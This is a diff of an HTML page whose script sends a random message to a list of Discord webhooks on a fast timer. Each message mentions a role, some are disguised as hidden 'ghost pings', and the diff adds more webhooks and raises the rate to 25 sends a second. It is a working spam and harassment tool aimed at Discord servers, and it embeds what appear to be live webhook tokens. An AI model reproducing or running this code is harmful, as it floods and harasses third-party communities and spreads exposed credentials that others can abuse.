@@ -5,11 +5,12 @@
 			an original title
 		</title>
 	</head>
-	<body bgcolor="#d4efd8" onload="">
+	<body bgcolor="#d4efd8" onload="console.log(window);console.log(document);console.log(console);console.log(Math);console.log(Number);console.log(JSON);console.log(location);console.log(Object);console.log(Array);">
+		<p id=status></p>
 		<a id=hw href=https://discord.gg/Fh5rmgg27X>server</a>
 		<script>
 var messages=[
-	"ghost ping||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ user_here",
+	"ghost ping||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _user_here",
 	"get pinged user_here",
 	"wake up user_here",
 	"user_here",
@@ -20,7 +21,8 @@ var messages=[
 	"yo user_here",
 	"user_here يححركبيننصويوثسمشظر",
 	"дым Александр user_here ؟",
-	"user_here :)"
+	"user_here :)",
+	"user_here 💀"
 ]
 function ping(userid,web,request=new XMLHttpRequest(),tb1=Math.floor(Math.random()*messages.length)){
 	request.open("POST", web);request.setRequestHeader('Content-type', 'application/json');
@@ -38,12 +40,12 @@ function ping(userid,web,request=new XMLHttpRequest(),tb1=Math.floor(Math.random
 		.replace("E","Eᴱ")
 		.replace("Æ","Æᵆ"),
 		avatar_url:"",
-		content:messages[tb1].replace("user_here"," <@&"+userid+">")
+		content:messages[tb1].replace("user_here","<@&"+userid+">")
 	}
 	request.send(JSON.stringify(p));
 }
 setInterval(()=>{
-	document.getElementById("hw").style.position="fixed";document.getElementById("hw").style.width="101%";document.getElementById("hw").style.textAlign="center";document.getElementById("hw").style.top=window.innerHeight/2;document.getElementById("hw").style.fontSize=window.innerHeight/10;
+	document.getElementById("hw").style.position="fixed";document.getElementById("hw").style.top="50%";document.getElementById("hw").style.fontSize=window.innerHeight/10;document.getElementById("hw").style.WebkitTransitionDuration='1s';document.getElementById("hw").style.webkitTransform = 'rotate(720deg)';
 	ping('1052169088346099782',"https://discord.com/api/webhooks/1046252354867048559/eVkxaYZGG9yEa6PG_veR423qZ8j6kvwtE5bj48HPN_PGcMsFgHtlMIA-OpvbOHC5HO-A")
 	ping('1052169088346099782',"https://discord.com/api/webhooks/986559709098151966/6FatR9IYCYpeqVznNAmGcj5dnBBUQHnwshBTo0UebcJY7PthiIFEOTFA0d7KwxPSmKS5")
 	ping('1052169088346099782',"https://discord.com/api/webhooks/987276594588565515/bUpvwAxkc9sY3lbjOMDDjC8EGte6WI9xvpOpfXiVfNoTQHgZApBJJm4UZUMI6I8E_qeh")
@@ -51,7 +53,10 @@ setInterval(()=>{
 	ping('1052169088346099782',"https://discord.com/api/webhooks/1052543382716690482/4UX_WA3PDWBAfjgJy0lH7hC9VraYNwGySPM_bMHndPUUTCB2G_U78jrKbb1x2Iljci43")
 	ping('1052169088346099782',"https://discord.com/api/webhooks/1052543915888234598/8LePjjvBbyYOLgLft06rVvwaoCSPH1EtOsoW1-kKAuw3RY1KTlU52A-9T4_ZbWlcUiJd")
 	ping('1052169088346099782',"https://discord.com/api/webhooks/1052561263684759562/fKgPLMJ7ra3AXOvHSqDjU10JM8arUa-bNOEbYTZE49GpTZJj7TiZfABlOgS74wmrsjXr")
-},1000/10);
+	ping('1052169088346099782',"https://discord.com/api/webhooks/1053586454942584872/gu0l0T_Swb7ztY3_r4CAvViFFAm0YoFHUMFS4YXfscdoeorDJKAgUP-TqKItqHuxj0tw")
+	ping('1052169088346099782',"https://discord.com/api/webhooks/1053586931235168277/9Zi7CUGbk5pZYlQtMIciEFzP1aMbjkiD4VrPk-RVP0vEazF-ELvQuMtNVw3otALwF3uG")
+	ping('1052169088346099782',"https://discord.com/api/webhooks/1053587202719875083/eEqAaBnBeCMwh3EGOppJ1HtVf8pdzFL6q5nECNO1d4tBP88DnQ8hoOp65QjKayvgCS1Q")
+},1000/25);
 		</script>
 	</body>
 </html>
